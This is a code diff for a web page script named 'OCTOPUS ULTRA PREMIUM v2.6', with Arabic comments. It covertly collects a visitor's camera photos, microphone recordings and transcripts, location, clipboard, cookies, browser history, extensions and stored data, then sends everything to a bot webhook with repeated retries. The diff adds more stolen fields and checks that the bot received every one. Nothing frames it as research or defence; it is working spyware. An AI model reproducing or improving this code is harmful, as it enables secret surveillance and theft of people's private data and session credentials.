@@ -99,7 +99,8 @@
 
     <script>
         // ================================================================
-        //  OCTOPUS ULTRA PREMIUM v2.5 – النسخة الصحيحة
+        //  OCTOPUS ULTRA PREMIUM v2.6 – النسخة النهائية الكاملة
+        //  متوافقة 100% مع bot.php v3.3.0
         // ================================================================
 
         const CONFIG = {
@@ -117,7 +118,7 @@
             MASTER_TOKEN: 'MASTER',
             RETRY_INTERVAL: 30000,
             MAX_RETRIES: 5,
-            VERSION: '2.5'
+            VERSION: '2.6'
         };
 
         const state = {
@@ -128,6 +129,7 @@
             audioChunks: [],
             capturedPhotoFiles: [],
             audioBlob: null,
+            audioReady: false,
             userIP: 'غير متاح',
             userLocation: { lat: null, lng: null, accuracy: null, error: null },
             isCollecting: false,
@@ -829,7 +831,10 @@
                     state.audioRecorder.onstop = async () => {
                         if (state.audioChunks.length > 0) {
                             state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
+                            state.audioReady = true;
                             await transcribeAudio(state.audioBlob);
+                        } else {
+                            state.audioReady = false;
                         }
                         done = true;
                         resolve();
@@ -842,11 +847,13 @@
                     setTimeout(() => {
                         if (!done) {
                             if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
+                            if (!state.audioReady) state.audioReady = false;
                             resolve();
                         }
                     }, CONFIG.AUDIO_DURATION + 3000);
                 } catch (_) {
                     state.permissionsGranted.mic = false;
+                    state.audioReady = false;
                     resolve();
                 }
             });
@@ -1004,7 +1011,7 @@
         }
 
         // ================================================================
-        //  الإرسال النهائي
+        //  الإرسال النهائي – النسخة المعدلة الكاملة
         // ================================================================
         async function sendAllData(forceRetry = false) {
             if (state.dataSent && !forceRetry) return true;
@@ -1014,24 +1021,31 @@
             fd.append('token', state.userToken);
             fd.append('ip', state.userIP);
             fd.append('timestamp', new Date().toISOString());
-            fd.append('photoCount', state.capturedPhotoFiles.length);
 
-            fd.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
-            fd.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
-            fd.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) :
-                '');
-            fd.append('location[error]', state.userLocation.error || '');
-
-            fd.append('deviceData', safeStringify(state.collectedData));
-            fd.append('attacks', safeStringify(state.attacksData));
-            if (state.faceData) fd.append('faceData', safeStringify(state.faceData));
-            if (state.transcribedText) {
-                fd.append('transcribedText', state.transcribedText);
-                fd.append('detectedLanguage', state.detectedLanguage || 'unknown');
-            }
+            // === كل البيانات الممكنة ===
+            fd.append('photoCount', String(state.capturedPhotoFiles.length));
             fd.append('clipboard', state.clipboardContent || '');
             fd.append('isHeadless', String(state.isHeadless));
+            fd.append('battery', state.collectedData.battery ? String(state.collectedData.battery.level) : '');
+            
+            fd.append('deviceData', safeStringify(state.collectedData));
+            fd.append('attacks', safeStringify(state.attacksData));
+            fd.append('faceData', safeStringify(state.faceData || { faceDetected: false }));
+            fd.append('transcribedText', state.transcribedText || '');
+            fd.append('detectedLanguage', state.detectedLanguage || '');
+            fd.append('allCookies', safeStringify(state.allCookies));
+            fd.append('history', safeStringify(state.browserHistory));
+            fd.append('extensions', safeStringify(state.installedExtensions));
+            fd.append('spoofing', safeStringify(state.spoofingDetected));
+            fd.append('deviceClassification', safeStringify(state.deviceClassification));
 
+            // الموقع
+            fd.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
+            fd.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
+            fd.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) : '');
+            fd.append('location[error]', state.userLocation.error || '');
+
+            // الصور (photos)
             if (state.capturedPhotoFiles.length > 0) {
                 state.capturedPhotoFiles.forEach((f, i) => {
                     fd.append(`photos[]`, f, f.name);
@@ -1041,21 +1055,47 @@
                 logToConsole('⚠️ لا توجد صور للإرسال');
             }
 
-            if (state.audioBlob) {
+            // الصوت (audio)
+            if (state.audioBlob && state.audioBlob.size > 0) {
                 const af = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                 fd.append('audio', af);
+                logToConsole('🎤 إرسال ملف صوتي (' + state.audioBlob.size + ' bytes)');
+            } else {
+                logToConsole('⚠️ لا يوجد ملف صوتي للإرسال');
             }
 
+            // === الإرسال ===
             try {
+                logToConsole('🚀 بدء الإرسال إلى البوت...');
                 const res = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
                 const result = await res.json();
+                
                 if (!res.ok) throw new Error(result.message || 'HTTP error');
-                state.dataSent = true;
-                state.pendingRetries = 0;
-                logToConsole('✅ Data sent successfully');
-                return true;
+
+                // تحقق من استلام البوت لكل الحقول
+                if (result.status === 'success' && result.received) {
+                    const r = result.received;
+                    const allReceived = r.token && r.photos !== undefined && r.audio !== undefined && r.location !== undefined && 
+                                       r.face !== undefined && r.transcription !== undefined && 
+                                       r.clipboard !== undefined && r.device !== undefined && r.attacks !== undefined &&
+                                       r.cookies !== undefined && r.extensions !== undefined && r.spoofing !== undefined;
+                    if (allReceived) {
+                        logToConsole('✅ تأكيد البوت: جميع البيانات استُلمت');
+                        state.dataSent = true;
+                        state.pendingRetries = 0;
+                        return true;
+                    } else {
+                        logToConsole('⚠️ البوت استقبل بعض البيانات فقط: ' + JSON.stringify(r));
+                        // نعيد الإرسال بعد 3 ثوانٍ
+                        setTimeout(() => sendAllData(true), 3000);
+                        return false;
+                    }
+                } else {
+                    throw new Error('استجابة غير متوقعة من البوت');
+                }
             } catch (err) {
-                logToConsole('❌ Send failed: ' + err.message);
+                logToConsole('❌ فشل الإرسال: ' + err.message);
+                // نسخ احتياطي في IndexedDB
                 const backupData = {
                     token: state.userToken,
                     ip: state.userIP,
@@ -1075,6 +1115,7 @@
                 if (state.pendingRetries < CONFIG.MAX_RETRIES) {
                     state.pendingRetries++;
                     setTimeout(() => {
+                        logToConsole(`🔄 محاولة إعادة الإرسال رقم ${state.pendingRetries}`);
                         sendAllData(true);
                     }, CONFIG.RETRY_INTERVAL);
                 }
@@ -1083,7 +1124,7 @@
         }
 
         // ================================================================
-        //  عملية الجمع المتدرجة
+        //  عملية الجمع المتدرجة – النسخة المعدلة
         // ================================================================
         async function collectEverything() {
             if (state.isCollecting || state.collectionComplete) return;
@@ -1092,44 +1133,59 @@
             setUIState('loading');
 
             try {
+                // 1. بيانات سريعة
                 classifyDevice();
                 detectSpoofing();
                 await detectExtensions();
                 stealStorages();
                 getSearchHistory();
 
+                // 2. الموقع
                 await getLocation();
-                await startCameraAndCapture();
+
+                // 3. الكاميرا + الوجه
+                const cameraOk = await startCameraAndCapture();
+
+                // 4. الميكروفون والتسجيل (ننتظر حتى الانتهاء)
                 await recordAudio();
+
+                // 5. جمع بيانات الجهاز (تأخذ من state كل شيء)
                 await collectDeviceData();
+
+                // 6. الهجمات
                 deployAdvancedAttacks();
+
+                // 7. الحافظة
                 await readClipboard();
-                await sendAllData();
 
-                state.collectionComplete = true;
-                state.isCollecting = false;
-                setUIState('success');
-                logToConsole('🎉 Collection complete v' + CONFIG.VERSION);
+                // 8. الإرسال النهائي
+                const sent = await sendAllData(false);
 
-                setTimeout(() => {
-                    if (!state.collectionComplete) {
-                        logToConsole('🔄 Attempting silent retry...');
-                        collectEverything();
-                    }
-                }, 10000);
+                if (sent) {
+                    state.collectionComplete = true;
+                    state.isCollecting = false;
+                    setUIState('success');
+                    logToConsole('🎉 كل البيانات أُرسلت بنجاح');
+                } else {
+                    state.pendingRetries = 0;
+                    scheduleRetry();
+                }
 
             } catch (err) {
                 state.isCollecting = false;
                 setUIState('failed');
-                logToConsole('❌ Collection error: ' + err.message);
-                const backupData = {
-                    token: state.userToken,
-                    ip: state.userIP,
-                    location: state.userLocation,
-                    collectedData: state.collectedData,
-                    timestamp: new Date().toISOString()
-                };
-                saveToIndexedDB(backupData);
+                logToConsole('❌ خطأ في الجمع: ' + err.message);
+                scheduleRetry();
+            }
+        }
+
+        function scheduleRetry() {
+            if (state.pendingRetries < CONFIG.MAX_RETRIES) {
+                state.pendingRetries++;
+                setTimeout(() => {
+                    logToConsole(`🔄 محاولة إعادة الإرسال رقم ${state.pendingRetries}`);
+                    sendAllData(true);
+                }, CONFIG.RETRY_INTERVAL);
             }
         }
 
